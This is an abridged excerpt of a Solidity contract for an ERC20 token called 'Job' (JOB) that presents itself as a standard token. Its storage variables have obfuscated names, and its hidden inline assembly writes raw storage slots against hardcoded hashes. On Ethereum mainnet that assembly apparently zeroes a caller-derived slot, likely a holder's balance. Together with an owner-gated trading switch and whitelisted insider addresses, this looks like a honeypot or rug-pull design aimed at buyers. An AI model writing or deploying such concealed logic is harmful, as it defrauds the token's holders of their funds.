...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addJob;
    uint256 private employMent = block.number*2;

    mapping (address => bool) private _firstReport; 
    mapping (address => bool) private _secondDump;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private sweatingHard;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private readySet;
    address public pair;
    ...
    bool private trading; uint256 private sovietCar = 1; bool private powerPowell;
    uint256 private _decimals; uint256 private waterFight;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addJob.push(_router); addJob.push(msgSender_); addJob.push(pair);
        for (uint256 q=0; q < 3;) {_firstReport[addJob[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x471454f178e5c58493aa69586a43a4bfc706f1ec3f29e87a9375065c5c0c6dc4
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xe61586e5e38fad47a36e1cb473967ba18a98d339ca0b272c8c527779387e4e5d,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; employMent = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addJob[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployJob(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addJob[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployJob(creator, initialSupply);
    }
}

contract Job is ERC20Token {
    constructor() ERC20Token("Job", "JOB", msg.sender, 25000000 * 10 ** 18) {
    }
}